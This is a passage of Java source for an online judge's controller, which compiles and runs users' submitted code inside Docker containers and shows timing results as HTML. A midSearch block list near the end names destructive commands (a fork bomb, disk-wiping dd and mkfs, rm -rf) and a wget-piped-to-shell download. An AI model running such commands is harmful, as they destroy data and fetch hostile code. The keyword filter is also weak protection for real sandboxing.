					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";
					try {

						tmp = shellCmd("sh /usr/local/apache/share/algoMid_c.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
					}

				} else if (lang.equals("java")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.class");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.class");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.java");
					codew.write(code);
					codew.close();

					FileWriter algo_java = new FileWriter("/usr/local/apache/share/algo_java.sh");
					algo_java.write("docker restart " + dockerName + "\n");
					algo_java.write("docker exec " + dockerName
							+ " sh -c 'export LC_ALL=C.UTF-8; cd data; javac -encoding utf-8 algotest.java 2> compileError.txt'");
					algo_java.close();
					shellCmd("sh /usr/local/apache/share/algo_java.sh");

					timeCheck("java -Dfile.encoding=utf-8 algotest");
					FileWriter algoMid_java = new FileWriter("/usr/local/apache/share/algoMid_java.sh");
					algoMid_java.write("docker restart " + dockerName + "\n");
					algoMid_java.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_java.write("docker stop " + dockerName + "\n");
					algoMid_java.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";

					try {

						tmp = shellCmd("sh /usr/local/apache/share/algoMid_java.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
					}

				} else if (lang.equals("python")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.py");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.py");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.py");
					codew.write("# -*- coding: utf-8 -*-\n" + code);
					codew.close();

					timeCheck("python3 algotest.py 2> compileError.txt");
					FileWriter algoMid_python = new FileWriter("/usr/local/apache/share/algoMid_python.sh");
					algoMid_python.write("docker restart " + dockerName + "\n");
					algoMid_python.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_python.write("docker stop " + dockerName + "\n");
					algoMid_python.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";
					try {

						tmp = shellCmd("sh /usr/local/apache/share/algoMid_python.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
					}

				} else if (lang.equals("javascript")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.js");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.js");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.js");
					codew.write(code);
					codew.close();

					timeCheck("js algotest.js 2> compileError.txt");
					FileWriter algoMid_js = new FileWriter("/usr/local/apache/share/algoMid_js.sh");
					algoMid_js.write("docker restart " + dockerName + "\n");
					algoMid_js.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_js.write("docker stop " + dockerName + "\n");
					algoMid_js.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";
					try {

						tmp = shellCmd("sh /usr/local/apache/share/algoMid_js.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
					}
				}
				result = result + "<br>&nbsp;&nbsp;<span style='color:#7BC379'>>>>>>>>&nbsp;????????????&nbsp;<<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;??????&nbsp;:&nbsp;" + today;

				result = result + "<br><br>&nbsp;&nbsp;>>>>>>>&nbsp;&nbsp;??????ID&nbsp;&nbsp;<<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;user&nbsp;:&nbsp;" + user_id;

				result = result + "<br><br>&nbsp;&nbsp;>>>>>>>&nbsp;????????????&nbsp;<<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;time&nbsp;:&nbsp;"
						+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");

			} catch (Exception e) {
				e.printStackTrace();
				result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>???????????????.</span>";

			}

		}

		map.put("result", result);
		return map;

	}

	@RequestMapping(value = "/searchProblem", method = RequestMethod.POST)
	@ResponseBody
	public void searchProblem(HttpSession session, String searchInput, String searchType) throws Exception {
		session.setAttribute("searchInput", searchInput);
		session.setAttribute("searchType", searchType);
	}

	@RequestMapping(value = "/problem/idcheck.do", method = RequestMethod.POST)
	@ResponseBody
	public Map<String, Object> problemcheck(String problem_id) throws Exception {
		Map<String, Object> map = new HashMap<String, Object>();

		boolean flag = false; // ????????????
		flag = problemService.checkId(problem_id);
		map.put("flag", flag);

		return map;
	}

	public static String shellCmd(String command) throws Exception {
		Runtime runTime = Runtime.getRuntime();
		Process process = runTime.exec(command);
		InputStream inputStream = process.getInputStream();

		InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
		BufferedReader bufferReader = new BufferedReader(inputStreamReader);

		String line;
		String result = "";
		if (bufferReader.readLine() != null) {
			while ((line = bufferReader.readLine()) != null) {
				result = result + "<br>" + line;
			}
		} else
			result = "?????? ??????";

		return result;
	}

	public static String Reader(String fileName) throws IOException {
		BufferedReader bufferReader = new BufferedReader(new FileReader(fileName));
		String result = "";
		while (true) {
			String line = bufferReader.readLine();
			if (line == null)
				break;
			result = result + "<br>" + line;
		}
		bufferReader.close();
		return result;
	}

	public static void timeCheck(String tmp) {

		try {
			FileWriter timeCheck = new FileWriter("/usr/local/apache/share/timeCheck.sh");
			timeCheck.write("beginTime=$(date +%s%N)" + "\n");
			timeCheck.write(tmp + " < testinput" + "\n");
			timeCheck.write("endTime=$(date +%s%N)" + "\n");
			timeCheck.write("elapsed=`echo \"($endTime - $beginTime) / 1000000\" | bc`" + "\n");
			timeCheck.write("elapsedSec=`echo \"scale=6;$elapsed / 1000\" | bc | awk '{printf \"%.6f\", $1}'`" + "\n");
			timeCheck.write("echo $elapsedSec sec > timeCheck.txt");
			timeCheck.close();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public static String midSearch(String tmp) {
		String[] data = { "system(", "sudo shutdown -h 0", "sudo init 0", "sudo poweroff", "shutdown -r now",
				"shutdown", "docker restart", "docker exec", "docker stop", "docker rm", "docker rmi", "docker-compose",
				"shutdown -r", "init 0", "init 6", "halt -f", "reboot -f", "shutdown -h", "rm -rf", "rm -r", "docker",
				":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget hxxp://malicious_source -O- | sh",
				"mkfs.ext3 /dev/sda", "> file", "^foo^bar", "dd if=/dev/random of=/dev/sda" };

		int cnp = 0;
		for (int i = 0; i < data.length; i++) {
			if (tmp.contains(data[i])) {
				cnp = cnp + 1;
				break;
			}
		}

		if (cnp == 0) {
			return tmp;
		} else {
			return "?????????????????????.";
		}

	}

}